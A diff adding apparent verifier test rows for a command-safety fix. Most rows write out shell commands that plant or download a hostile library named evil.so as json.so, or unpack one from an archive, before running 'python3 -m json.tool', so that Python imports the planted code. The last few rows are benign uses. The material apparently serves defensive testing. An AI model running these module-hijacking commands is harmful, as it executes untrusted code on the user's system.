@@ -956,3 +956,33 @@ verifier of 4636e20a (CRW-894 f3)	cd "$DIR"; printf x | python3 -m json.tool	CRW
 verifier of 4636e20a (CRW-894 f3)	printf x | python3 -m json.tool	CRW-894-vf-35	row	-
 verifier of 4636e20a (CRW-894 f3)	printf x | python3 -m json.tool	CRW-894-vf-36	row	-
 verifier of 4636e20a (CRW-894 f3)	printf x | python3 -m json.tool	CRW-894-vf-37	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp evil.so json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-01	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp evil.so json/__init__.so; printf '{}' | python3 -m json.tool	CRW-894-vr-02	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp evil.so json.cpython-312-x86_64-linux-gnu.so; printf '{}' | python3 -m json.tool	CRW-894-vr-03	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp evil.so json.abi3.so; printf '{}' | python3 -m json.tool	CRW-894-vr-04	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so > json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-05	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so > json/__init__.cpython-312-x86_64-linux-gnu.so; printf '{}' | python3 -m json.tool	CRW-894-vr-06	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so >> json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-07	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so | tee json.so >/dev/null; printf '{}' | python3 -m json.tool	CRW-894-vr-08	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp -r pkg json; printf '{}' | python3 -m json.tool	CRW-894-vr-09	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp -r pkg/. .; printf '{}' | python3 -m json.tool	CRW-894-vr-10	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	mv evil.so json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-11	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	install evil.so json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-12	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	ln -s evil.so json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-13	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	for i in 1 2; do printf '{}' | python3 -m json.tool; cp evil.so json.so; done	CRW-894-vr-14	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	printf '{}' | python3 -m json.tool & cp evil.so json.so; wait	CRW-894-vr-15	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so > sub/json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-16	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	tar xf evil.tar; printf '{}' | python3 -m json.tool	CRW-894-vr-17	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	unzip -o evil.zip; printf '{}' | python3 -m json.tool	CRW-894-vr-18	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	python3 -c "import shutil; shutil.copy('evil.so', 'json.so')"; printf '{}' | python3 -m json.tool	CRW-894-vr-19	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	curl -so json.so https://example.invalid/x; printf '{}' | python3 -m json.tool	CRW-894-vr-20	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	dd if=evil.so of=json.so; printf '{}' | python3 -m json.tool	CRW-894-vr-21	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cp evil.so "$N"; printf '{}' | python3 -m json.tool	CRW-894-vr-22	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	bash -c 'cp evil.so json.so'; printf '{}' | python3 -m json.tool	CRW-894-vr-23	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so > json.so & printf '{}' | python3 -m json.tool	CRW-894-vr-24	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat evil.so > "$N"; printf '{}' | python3 -m json.tool	CRW-894-vr-25	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	grep '"pr": *737' alerts.jsonl | tail -1 | python3 -m json.tool | head -80	CRW-894-vr-26	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cat in.json | python3 -m json.tool > out.json	CRW-894-vr-27	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	echo '{}' | python3 -m json.tool 2>&1 | head -5	CRW-894-vr-28	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	echo '{}' > in.json; python3 -m json.tool < in.json	CRW-894-vr-29	row	-
+verifier of 5d41d266 (CRW-894 fix round 2)	cd sub && printf '{}' | python3 -m json.tool	CRW-894-vr-30	row	-
